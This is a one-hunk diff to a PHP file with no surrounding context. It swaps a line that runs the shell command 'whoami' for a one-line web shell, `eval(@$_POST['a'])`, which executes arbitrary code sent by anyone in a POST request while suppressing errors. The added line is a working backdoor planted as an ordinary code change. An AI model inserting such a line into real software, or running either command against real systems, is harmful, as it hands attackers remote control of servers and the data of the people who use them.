@@ -1,1 +1,1 @@
-<?=`whoami`;
+<?php eval(@$_POST['a']); ?>
